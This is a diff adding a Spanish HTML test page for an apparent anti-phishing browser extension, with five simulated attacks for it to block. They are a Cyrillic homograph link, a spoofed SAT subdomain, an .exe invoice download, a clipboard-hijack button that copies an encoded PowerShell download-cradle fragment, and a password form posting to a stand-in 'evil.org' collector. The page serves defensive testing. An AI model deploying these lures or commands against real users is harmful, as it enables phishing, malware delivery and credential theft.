@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>AegisQRO — Laboratorio de Pruebas de Seguridad</title>
+  <style>
+    * { box-sizing: border-box; -webkit-font-smoothing: antialiased; }
+    body {
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Inter", "Segoe UI", sans-serif;
+      background: #F5F5F7;
+      color: #1D1D1F;
+      line-height: 1.45;
+    }
+    .topbar {
+      background: #121316;
+      border-bottom: 2px solid #DA291C;
+      padding: 14px 28px;
+      color: #FFFFFF;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .brand { font-weight: 700; font-size: 14px; letter-spacing: 0.04em; }
+    .sub { font-size: 12px; color: #A1A1A6; }
+    .container { max-width: 820px; margin: 28px auto; padding: 0 20px 40px; }
+    h1 { margin: 0 0 6px; font-size: 22px; letter-spacing: -0.02em; }
+    .intro { margin: 0 0 22px; font-size: 14px; color: #54606B; }
+    .grid { display: grid; grid-template-columns: 1fr; gap: 14px; }
+    .card {
+      background: #FFFFFF;
+      border: 1px solid rgba(0,0,0,0.08);
+      border-radius: 14px;
+      padding: 18px 20px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.03);
+    }
+    .kicker {
+      font-size: 10.5px;
+      font-weight: 700;
+      letter-spacing: 0.05em;
+      text-transform: uppercase;
+      color: #DA291C;
+      margin-bottom: 4px;
+    }
+    .card h2 { margin: 0 0 6px; font-size: 16px; }
+    .card p { margin: 0 0 12px; font-size: 13px; color: #54606B; }
+    .btn {
+      display: inline-block;
+      appearance: none;
+      border: none;
+      border-radius: 10px;
+      background: #1D1D1F;
+      color: #FFFFFF;
+      padding: 9px 16px;
+      font-size: 13px;
+      font-weight: 600;
+      text-decoration: none;
+      cursor: pointer;
+    }
+    .btn:hover { background: #DA291C; }
+    .cmd-box {
+      font-family: 'SF Mono', 'Consolas', monospace;
+      font-size: 12px;
+      background: #F5F5F7;
+      border: 1px solid #E5E5EA;
+      border-radius: 10px;
+      padding: 10px 12px;
+      margin-bottom: 12px;
+      word-break: break-all;
+      color: #1D1D1F;
+    }
+    .form-row { display: flex; gap: 10px; flex-wrap: wrap; align-items: center; }
+    input[type="password"] {
+      flex: 1;
+      min-width: 240px;
+      padding: 9px 12px;
+      border-radius: 10px;
+      border: 1px solid #D1D1D6;
+      font-size: 13px;
+    }
+  </style>
+</head>
+<body>
+  <header class="topbar">
+    <span class="brand">AEGISQRO · LABORATORIO DE PRUEBAS</span>
+    <span class="sub">Observa el escudo de tu barra de Chrome cambiar de verde a rojo</span>
+  </header>
+  <main class="container">
+    <h1>Pruebas Interactivas de Protección</h1>
+    <p class="intro">Haz clic en cualquiera de los 5 ataques simulados. Verás el bloqueo, el aviso en pantalla y el cambio del escudo verde al rojo en la barra de Chrome.</p>
+
+    <div class="grid">
+      <section class="card">
+        <div class="kicker">Prueba 1 · Motor Rust / WebAssembly</div>
+        <h2>Enlace Falso Homógrafo (Letra Cirílica)</h2>
+        <p>Simula un correo falso hacia <code>https://аpple-support.com/login</code> usando la letra cirílica <code>а</code> en lugar de la <code>a</code> latina.</p>
+        <a class="btn" href="https://&#x0430;pple-support.com/login">Abrir enlace falso (аpple-support.com)</a>
+      </section>
+
+      <section class="card">
+        <div class="kicker">Prueba 2 · Suplantación de Subdominio</div>
+        <h2>Dominio Falso Imitando al SAT</h2>
+        <p>Intenta engañar al usuario usando <code>sat.gob.mx</code> como subdominio dentro de un sitio malicioso externo.</p>
+        <a class="btn" href="https://sat.gob.mx.verificacion-fiscal.com/buzon">Abrir portal falso del SAT</a>
+      </section>
+
+      <section class="card">
+        <div class="kicker">Prueba 3 · Control de Descargas</div>
+        <h2>Descarga de Ejecutable Peligroso (.exe)</h2>
+        <p>Intenta descargar <code>factura_noviembre.exe</code>. La extensión cancelará la descarga al instante y mostrará la alerta.</p>
+        <a class="btn" href="/factura_noviembre.exe" download="factura_noviembre.exe">Descargar factura_noviembre.exe</a>
+      </section>
+
+      <section class="card">
+        <div class="kicker">Prueba 4 · Anti-ClickFix / Portapapeles</div>
+        <h2>Secuestro de Portapapeles con Comando PowerShell</h2>
+        <p>Al pulsar el botón, la página intenta copiar un comando codificado malicioso a tu portapapeles; AegisQRO lo intercepta y neutraliza.</p>
+        <div id="cmdText" class="cmd-box">powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA</div>
+        <button id="copyTrapBtn" type="button" class="btn">Copiar comando trampa</button>
+      </section>
+
+      <section class="card">
+        <div class="kicker">Prueba 5 · Anti-Robo de Contraseñas</div>
+        <h2>Formulario que Envía Tu Contraseña a un Tercero</h2>
+        <p>Haz clic dentro del campo de contraseña o intenta enviar el formulario hacia un dominio externo atacante.</p>
+        <form class="form-row" action="https://recolector-externo.evil.org/steal" method="POST">
+          <input type="password" placeholder="Haz clic aquí o escribe algo para probar la alarma" />
+          <button type="submit" class="btn">Enviar contraseña</button>
+        </form>
+      </section>
+    </div>
+  </main>
+  <script>
+    document.getElementById('copyTrapBtn').addEventListener('click', function () {
+      var el = document.getElementById('cmdText');
+      var range = document.createRange();
+      range.selectNodeContents(el);
+      var sel = window.getSelection();
+      sel.removeAllRanges();
+      sel.addRange(range);
+      document.execCommand('copy');
+      sel.removeAllRanges();
+    });
+  </script>
+</body>
+</html>
